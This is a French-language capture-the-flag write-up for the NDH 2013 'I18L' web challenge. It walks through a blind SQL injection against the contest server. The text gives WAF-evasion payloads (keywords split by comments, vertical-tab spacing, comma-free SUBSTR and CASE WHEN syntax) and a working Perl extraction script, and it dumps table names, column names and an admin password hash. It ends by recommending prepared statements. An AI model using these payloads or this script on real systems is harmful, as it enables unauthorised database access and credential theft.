NDH 2013 Quals – Write-up Web 200  I18L
=========================================

## INTRO


Excellents challenges que nous ont préparé les amis de Hackerzvoice cette année. Parmi eux, le challenge web I18L valant son pesant d'or (200 points) nous a particulièrement régalé.  

Le coté intéressant du challenge, ce n'est bien sûr pas la détection de la vulnérabilité qui nous saute aux yeux, mais plus l'exploitation en elle même.  
En cela, on note une grosse différence avec les challenges actuels, où une partie du défi est de comprendre où veulent en venir les organisateurs. On peut donc s'attendre à une exploitation carabinée sur fond de Chevauchée des Walkyries.  

## Let's go

Voici l'URL de la page principale en français :  

> http://z0b.nuitduhack.com:8000/index.php?article=ndh,1,fr (on l'appellera page 1)  

> http://z0b.nuitduhack.com:8000/index.php?article=ndh,2,fr (page 2)  


On note que le paramètre 'article' paraît assez singulier. Les virgules étant particulières dans des paramètres, on sent qu'il doit bien y avoir un explode() quelque part.  
Premier constat : Si on doit faire une exploitation ça sera sans virgules !  

Si l'on place un caractère spécial dans le paramètre, on se prend une page blanche et l'erreur suivante : « 418 I'm a teapot ».  
Je ne sais pas vous, mais dès que je vois un id dans une URL, j'ai envie de m'amuser avec (mais évidemment je ne le fais pas), et ce que j'aime le plus faire, c'est tester des opérations arithmétiques pour voir ce que ça donne.  
On essaie donc de voir si l'URL est dynamique lorsqu'on fait des opération :  

http://z0b.nuitduhack.com:8000/index.php?article=ndh,1%2b1,fr (0x2B = +) YES !  
On arrive à la page 2, donc il y a des grandes chances que l'on aie une base de données qui interprète les page ids.  
On va donc pouvoir commencer à broder là dessus.  

À partir de ce moment, le mieux est d'avoir un payload qui soit stable, donc un payload qui renvoie « True » ou « False ». Pour ça, on utilise traditionnellement IF(comparaison,  action-si, action-sinon).  
Le problème, c'est bien entendu les virgules obligatoires. Mais il existe une solution à ça : CASE WHEN … THEN .. ELSE … END
On peut déjà imaginer un payload de base :  

```ndh,1%2b(SELECT (CASE WHEN 1<2 THEN 1 ELSE 0 END))``` 
  
1<2 étant la comparaison qui nous intéresse, elle retournera 1 si c'est juste, 0 si c'est faux. Traduction, on aura la page http://z0b.nuitduhack.com:8000/index.php?article=ndh,2,fr en cas de bonne comparaison et http://z0b.nuitduhack.com:8000/index.php?article=ndh,1,fr en cas de mauvaise comparaison.  

On teste ce payload pour voir si ça marche (on devrait obtenir la page 2)...  
ENFER ET DAMNATION que dalle ! On se prend une vilaine page blanche, cette bonne vieille erreur 418. On en déduit que cette erreur est due à un filtrage, soit par expression régulière, soit par un Web Application Firewall, qui nous jette dès qu'il détecte du langage SQL.  

Après quelques tests, on parvient à lister ce qui ne plaît pas à notre ami le WAF :  
	* SELECT, FROM, WHERE, SUBSTR, MID, UNION, etc.  
	* [,* +] ← Crochets exclus.  

Aïe aïe aïe, difficile sans espaces/+ ni instructions mais pas impossible !  
Il va sans dire que par économie(voir après), on a automatiquement tendance à remplacer les OR par || et les AND par && (%26%26 pour éviter que ce soit mal interprété par PHP).  

Première bonne  nouvelle, on peut utiliser les fonction comme SELECT en y implantant un commentaire (possible pour le WAF, et pas d'URL Rewriting) comme ceci : SEL/**/ECT.
Le deuxième problème de taille était l'absence d'espaces. On peut cependant utiliser le caractère %0b qui est un TAB vertical afin de remplacer l'espace. Ne restent plus que les virgules, et là, on est bien embêtés. Mais pourquoi ? Parce que pour réaliser une attaque par Blind SQL Injection, on a absolument besoin d'une fonction du style SUBSTRING/SUBSTR/MID, mais que celles-ci utilisent des virgules pour séparer les arguments. Oui mais il existe, également une syntaxe moins connue, qui nous permet d'éviter les virgules : SUBSTR(data from 1 for 1).
Imaginons un payload qui serait utilisé pour savoir si la version de la base de données est inférieure à 5 :  

- ```SEL/**/ECT(CASE%0BWHEN(@@version<5)THEN%0B1%0BELSE%0B0%0BEND)```  => 0  
- ```SEL/**/ECT(CASE%0BWHEN(@@version>5)THEN%0B1%0BELSE%0B0%0BEND)```  => 0  

- ```SEL/**/ECT(CASE%0BWHEN(@@version=5)THEN%0B1%0BELSE%0B0%0BEND)```  => 1 
 
Ah, victoire ! Un résultat probant ! C'est donc une version 5 de MySQL (car @@version est une syntaxe typique à ce type de DB).  
 
Passons maintenant aux choses plus sérieuses, en devinant le premier caractère de la base de données :  

- ```SEL/**/ECT(CASE%0BWHEN(SUBSTR(database()%0bFR/**/OM%0B1%0BFOR%0B1)='A')THEN%0B1%0BELSE%0B0%0BEND)``` => 0  

- ```SEL/**/ECT(CASE%0BWHEN(SUBSTR(database()%0bFR/**/OM%0B1%0BFOR%0B1)='B')THEN%0B1%0BELSE%0B0%0BEND)``` => 0  

- ```SEL/**/ECT(CASE%0BWHEN(SUBSTR(database()%0bFR/**/OM%0B1%0BFOR%0B1)='C')THEN%0B1%0BELSE%0B0%0BEND)``` => 1  

**Bingo!** On a la première lettre du nom de la DB: "C".  

Comme on n'a pas que ça à faire, chercher lettre par lettre à la main, on va écrire un exploit qui nous permettra d'automatiser tout ça:  

	#!/usr/bin/perl  
	use LWP::Simple;  
	use 5.010;  
	$| = 1;  

	my ($content, $url, $data, $juicy);  

	my $length = 40;  
	my $query = "dat/**/abase%28%29";  

	print "Found content:"  
	for my $n (1..$length) {  
		for my $c (32..126) {  
			$url = "http://z0b.nuitduhack.com:8000/index.php?article=ndh," .  
	                "1%2b%28sel/**/ect%28case%0Bwhen%28subs/**/tr%28%28" . $query . "%29%0Bfr/**/om%0B" . $n . "%0Bfor%0B1%29=char(" .  
	                $_ .  
	                ")%29%0Bthen%0B%0B1%0Belse%0B0%0BEND%29%29,fr";  
			$content = get $url;  
			if ($content =~ /soumettre/) {  
				$data = pack("U*", $c);  
				print "\nFound content:", next if ($c == 44);  
				print $data;  
				$juicy .= $data;  
				last;  
			}  
		sleep(1);  
		}  
	}  

	say "[*] Retrieved data: " . $juicy;  


Output :  
```  
Found content: CTF  
[*] Retrieved data: CTF  
```  
  
  
## Database discovery  

Ok, maintenant que nous avons un exploit nous pouvons injecter des requêtes SQL afin de déterminer la structure de notre cible :).  

Nous avons le nom de la base de données : `ctf`, récupérons le nom des différentes tables de celle-ci :  

``` my $query = "SE/**/LECT%0BGRO/**/UP_CO/**/NCAT%28ta/**/ble_n/**/ame%29F/**/ROM%0Binfo/**/rmation_s/**/chema.tab/**/les%0BWHE/**/RE%0Btable_schema%0BIN%28'ctf'%29"; ```  

Décodé :  
```SELECT GROUP_CONCAT(table_name FROM information_schema.tables WHERE table_schema IN 'ctf'```  
  
Output :  
```  
Found content: LANGUAGES  
Found content: NEWS  
Found content: SECTIONS  
Found content: USERS  
[*] Retrieved data: LANGUAGES,NEWS,SECTIONS,USERS  
```  
  
La base de données est donc constituée des tables suivantes :  

- languages
- news
- sections
- users
  
La table qui nous intéresse est `users` (intuition ? :))  
  
La requête suivante nous remonte les différents champs de la table `users`  
  
```$query = "SE/**/LECT%0B(GRO/**/UP_CO/**/NCAT%28colu/**/mn_na/**/me%29)F/**/ROM%0Binfo/**/rmation_s/**/chema.colu/**/mns%0BWH/**/ERE%0Btabl/**/e_na/**/me%0BIN('us/**/ers')";```  
  
Décodé :  
``` SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name IN('users') ```  
  
Output :  

	Found content: ID  
	Found content: NAME  
	Found content: SURNAME  
	Found content: PASSWORD  
	Found content: ADMIN 
	 
	[*] Retrieved data: ID,NAME,SURNAME,PASSWORD,ADMIN  
 
La table est donc constituée des champs suivants :  
  
- id
- name
- surname
- password
- admin

Il y a un champs appelé `admin`, qui n'est bien entendu pas à négliger.  
Il y a fort à parier que ce champs soit de type boolean. Et donc que sa valeur soit à `0` pour un utilisateur non-admin, et passe à `1` pour un administrateur. Vérifions cela :  
  
``` my $query = "SE/**/LECT%0BGRO/**/UP_CO/**/NCAT%28ad/**/min%29%0BF/**/ROM%0Buse/**/rs"; ```  

Décodé :  
``` SELECT GROUP_CONCAT(admin) FROM users ```  


Output :  

	Found content: 0  
	Found content: 0  
	Found content: 0  
	Found content: 0  
	Found content: 0  
	Found content: 0  
	Found content: 1  
	Found content: 0  
	Found content: 0  
	
	[*] Retrieved data: 0,0,0,0,0,0,1,0,0  


Le résultat de cette requête est constitué de plusieurs `0` ainsi que d'un `1` :). Nous avons donc un administrateur dans cette table :P.  

Bon, récupérons le mot de passe de l'administrateur :) :  
``` my $query = "SE/**/LECT%0BGRO/**/UP_CO/**/NCAT%28pas/**/swo/**/rd%29%0BF/**/ROM%0Buse/**/rs%0BWHE/**/RE%0Bad/**/min%0BIN(1)"; ```

Décodé :  
``` SELECT GROUP_CONCAT(password) FROM users WHERE admin IN(1) ```



Output :  

	Found content: 9342BDEBA5A87C209FE12D5A55DCE8BE  
	[*] Retrieved data: 9342BDEBA5A87C209FE12D5A55DCE8BE  



Le password enregistré ressemble fortement à du hash md5 : `9342BDEBA5A87C209FE12D5A55DCE8BE`  

Mais pas besoin de cracker quoi que ce soit, le hash avec les caractères en minuscule valide le challenge.. :D  

**Flag**: `9342bdeba5a87c209fe12d5a55dce8be`  

En conclusion, il paraît beaucoup plus difficile de se protéger contre les injection SQL en aval (Mise en place de WAF et de filtrage de requêtes) qu'en amont: Opter pour un système par requêtes préparées élimine toute attaque connue à ce jour et nous apparaît bien plus simple et bon marché à mettre en place. 
À bientôt pour de nouvelles aventures!

## Authors
* Sliim <sliim@mailoo.org>
* ZadYree <zadyree@tuxfamily.org>
* GoT <http://rambaudpierre.fr>
